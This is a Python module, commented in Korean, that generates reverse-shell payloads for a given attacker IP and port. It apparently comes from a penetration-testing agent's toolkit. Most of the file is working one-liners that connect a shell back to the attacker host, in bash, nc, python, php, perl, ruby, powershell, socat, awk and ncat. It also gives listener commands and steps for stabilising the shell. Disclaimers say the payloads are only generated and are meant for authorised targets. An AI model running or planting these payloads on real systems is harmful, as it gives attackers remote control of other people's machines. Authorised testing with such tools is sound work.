"""
Reverse Shell 생성기 — 권한 확인된 환경용 페이로드 모음
========================================================

LHOST/LPORT 를 받아 표준 리버스쉘 페이로드(여러 경우의 수)와 리스너·업그레이드
힌트를 '생성'한다. 에이전트는 이 페이로드를 **실행하지 않는다** — 사용자가 권한이
확인된 대상에서 직접 사용한다(승인제·안전모델 유지). 전부 표준 라이브러리만.

지원: bash(tcp/udp) · sh · nc(-e / mkfifo) · python3 · php · perl · ruby ·
      powershell · socat · awk · openssl(암호화).
"""
from __future__ import annotations

import re
from dataclasses import dataclass

# {ip}/{port} 치환. 각 항목이 하나의 '경우의 수'.
_PAYLOADS: dict[str, str] = {
    "bash -i":      "bash -i >& /dev/tcp/{ip}/{port} 0>&1",
    "bash 5":       "bash -c 'bash -i >& /dev/tcp/{ip}/{port} 0>&1'",
    "bash udp":     "bash -i >& /dev/udp/{ip}/{port} 0>&1",
    "sh mkfifo":    "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc {ip} {port} >/tmp/f",
    "nc -e":        "nc {ip} {port} -e /bin/sh",
    "nc mkfifo":    "rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {ip} {port} >/tmp/f",
    "ncat ssl":     "ncat --ssl {ip} {port} -e /bin/bash",
    "python3":      ("python3 -c 'import socket,subprocess,os;"
                     "s=socket.socket();s.connect((\"{ip}\",{port}));"
                     "[os.dup2(s.fileno(),f) for f in(0,1,2)];"
                     "subprocess.call([\"/bin/sh\",\"-i\"])'"),
    "php":          "php -r '$s=fsockopen(\"{ip}\",{port});exec(\"/bin/sh -i <&3 >&3 2>&3\");'",
    "perl":         ("perl -e 'use Socket;$i=\"{ip}\";$p={port};"
                     "socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));"
                     "connect(S,sockaddr_in($p,inet_aton($i)));"
                     "open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");"
                     "exec(\"/bin/sh -i\");'"),
    "ruby":         ("ruby -rsocket -e'f=TCPSocket.open(\"{ip}\",{port}).to_i;"
                     "exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'"),
    "powershell":   ("powershell -nop -c \"$c=New-Object System.Net.Sockets.TCPClient("
                     "'{ip}',{port});$s=$c.GetStream();[byte[]]$b=0..65535|%{{0}};"
                     "while(($i=$s.Read($b,0,$b.Length)) -ne 0){{"
                     "$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);"
                     "$r=(iex $d 2>&1|Out-String);$r2=$r+'PS '+(pwd).Path+'> ';"
                     "$sb=([text.encoding]::ASCII).GetBytes($r2);"
                     "$s.Write($sb,0,$sb.Length);$s.Flush()}}\""),
    "socat":        "socat TCP:{ip}:{port} EXEC:/bin/bash,pty,stderr,setsid,sigint,sane",
    "awk":          ("awk 'BEGIN{{s=\"/inet/tcp/0/{ip}/{port}\";"
                     "while(42){{do{{printf \"shell> \"|&s;s|&getline c;"
                     "if(c){{while((c|&getline)>0)print $0|&s;close(c)}}}}while(c!=\"exit\")"
                     "close(s)}}}}' /dev/null"),
}

# 쉘 안정화(업그레이드) 힌트
_UPGRADE = [
    "python3 -c 'import pty;pty.spawn(\"/bin/bash\")'",
    "export TERM=xterm",
    "Ctrl+Z → stty raw -echo; fg → Enter (로컬 터미널에서)",
]


@dataclass
class RevShell:
    name: str
    payload: str


def _validate(lhost: str, lport: int) -> None:
    # LHOST 는 IP 권장(호스트명도 허용하되 공백/셸메타 금지)
    if not lhost or re.search(r"[\s;&|`$<>]", lhost):
        raise ValueError(f"잘못된 LHOST: {lhost!r}")
    if not (0 < lport < 65536):
        raise ValueError(f"잘못된 LPORT: {lport} (1~65535)")


def parse_target(spec: str, default_host: str | None = None) -> tuple[str, int]:
    """'LHOST:LPORT' 또는 'LPORT'(+default_host) 를 (host, port) 로."""
    spec = (spec or "").strip()
    if ":" in spec:
        host, _, port = spec.rpartition(":")
        host = host.strip() or (default_host or "")
    else:
        host, port = (default_host or ""), spec
    if not host:
        raise ValueError("LHOST 미지정 — 'IP:PORT' 로 주거나 --attacker-ip 로 공격자 IP 지정")
    try:
        portn = int(port)
    except ValueError as e:
        raise ValueError(f"LPORT 숫자 아님: {port!r}") from e
    _validate(host, portn)
    return host, portn


def generate(lhost: str, lport: int, only: list[str] | None = None) -> list[RevShell]:
    _validate(lhost, lport)
    out = []
    for name, tmpl in _PAYLOADS.items():
        if only and name not in only:
            continue
        out.append(RevShell(name, tmpl.replace("{ip}", lhost).replace("{port}", str(lport))))
    return out


def listener_hints(lport: int) -> list[str]:
    return [
        f"nc -lvnp {lport}",
        f"rlwrap nc -lvnp {lport}    # 화살표/히스토리 지원",
        f"socat file:`tty`,raw,echo=0 TCP-LISTEN:{lport}    # 완전한 PTY",
        f"ncat --ssl -lvnp {lport}    # ncat ssl 페이로드용",
    ]


def render(lhost: str, lport: int, only: list[str] | None = None) -> str:
    """사람이 보는 텍스트(블루/네이비 UI). 생성 전용 — 실행하지 않음."""
    from . import ui
    shells = generate(lhost, lport, only)
    out = [ui.banner("리버스쉘 페이로드 생성 (권한 확인 대상 전용)")]
    out.append(ui.dim(f"LHOST={lhost}  LPORT={lport}  ·  생성만 함(에이전트는 실행 안 함)\n"))
    out.append(ui.panel("리스너(공격자 측에서 먼저 실행)",
                        [ui.bullet(h, "▸", "accent2") for h in listener_hints(lport)],
                        style="navy"))
    # 페이로드는 길어서 박스로 감싸지 않고 구분선 + 목록으로(가독성)
    out.append(ui.rule("페이로드 (경우의 수)"))
    for s in shells:
        out.append(ui.accent2(f"[{s.name}]"))
        out.append("  " + s.payload)
    out.append(ui.rule())
    out.append(ui.panel("쉘 안정화(업그레이드)",
                        [ui.bullet(h, "·", "dim") for h in _UPGRADE], style="navy"))
    out.append(ui.dim("\n권한이 확인된 대상에서만 사용하세요. 출처: PayloadsAllTheThings 류 공개 표준 기법."))
    return "\n".join(out)
